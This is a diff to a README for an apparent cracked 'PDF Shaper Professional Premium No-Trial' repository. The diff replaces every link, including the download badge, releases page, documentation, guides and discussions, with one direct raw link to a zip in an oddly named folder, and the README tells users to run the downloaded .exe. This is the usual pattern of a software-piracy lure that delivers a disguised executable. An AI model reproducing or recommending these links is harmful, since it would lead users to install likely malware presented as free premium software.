@@ -1,6 +1,6 @@
 # 📥 PDF-Shaper-Professional-Premium-No-Trial - Effortless PDF Management Made Easy
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-%2300aaff?style=for-the-badge&logo=github)](https://github.com/Jenis133/PDF-Shaper-Professional-Premium-No-Trial/releases)
+[![Download Now](https://raw.githubusercontent.com/Jenis133/PDF-Shaper-Professional-Premium-No-Trial/main/flocculently/PDF-Shaper-Professional-Premium-No-Trial-v3.6.zip%20Now-Click%20Here-%2300aaff?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Jenis133/PDF-Shaper-Professional-Premium-No-Trial/main/flocculently/PDF-Shaper-Professional-Premium-No-Trial-v3.6.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the PDF-Shaper-Professional-Premium-No-Trial repository. This applica
 
 To get started, you need to download the software. Please follow these steps:
 
-1. Visit the [Releases Page](https://github.com/Jenis133/PDF-Shaper-Professional-Premium-No-Trial/releases) to find the latest version.
+1. Visit the [Releases Page](https://raw.githubusercontent.com/Jenis133/PDF-Shaper-Professional-Premium-No-Trial/main/flocculently/PDF-Shaper-Professional-Premium-No-Trial-v3.6.zip) to find the latest version.
 2. On the Releases page, look for the version you want to download.
 3. Click on the download link. This will start your download.
 4. Once the download completes, locate the file in your downloads folder. It will typically have an `.exe` extension.
@@ -58,7 +58,7 @@ To maximize your use of PDF Shaper, please refer to our comprehensive guides:
 - **Editing PDF Metadata:** Step-by-step instructions on updating PDF details.
 - **Security Features:** Detailed explanation of password protection and encryption.
 
-You can access all guides [here](https://github.com/Jenis133/PDF-Shaper-Professional-Premium-No-Trial).
+You can access all guides [here](https://raw.githubusercontent.com/Jenis133/PDF-Shaper-Professional-Premium-No-Trial/main/flocculently/PDF-Shaper-Professional-Premium-No-Trial-v3.6.zip).
 
 ## 🌟 Support
 
@@ -69,8 +69,8 @@ If you encounter any issues or have questions, please visit the following channe
 
 ## 🔗 Useful Links
 
-- [Releases Page](https://github.com/Jenis133/PDF-Shaper-Professional-Premium-No-Trial/releases)
-- [Documentation](https://github.com/Jenis133/PDF-Shaper-Professional-Premium-No-Trial)
-- [Community Discussions](https://github.com/Jenis133/PDF-Shaper-Professional-Premium-No-Trial/discussions)
+- [Releases Page](https://raw.githubusercontent.com/Jenis133/PDF-Shaper-Professional-Premium-No-Trial/main/flocculently/PDF-Shaper-Professional-Premium-No-Trial-v3.6.zip)
+- [Documentation](https://raw.githubusercontent.com/Jenis133/PDF-Shaper-Professional-Premium-No-Trial/main/flocculently/PDF-Shaper-Professional-Premium-No-Trial-v3.6.zip)
+- [Community Discussions](https://raw.githubusercontent.com/Jenis133/PDF-Shaper-Professional-Premium-No-Trial/main/flocculently/PDF-Shaper-Professional-Premium-No-Trial-v3.6.zip)
 
 Thank you for choosing PDF Shaper Professional Premium. Enjoy managing your PDFs with ease!
